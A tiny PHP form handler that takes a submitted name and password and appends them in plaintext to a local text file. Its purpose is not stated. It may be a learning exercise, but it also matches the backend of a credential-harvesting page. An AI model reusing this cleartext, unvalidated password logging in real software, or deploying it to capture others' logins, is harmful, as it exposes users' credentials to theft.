<?php 
    $nom=$_POST["nom"];
    $pass=$_POST["pass"];
    $idfile=fopen("fichier.txt","a");
    flock($idfile, 2);
    fwrite($idfile, $nom ."_".$pass."\r"."\n");
    flock($idfile, 3);
    fclose($idfile);
?>











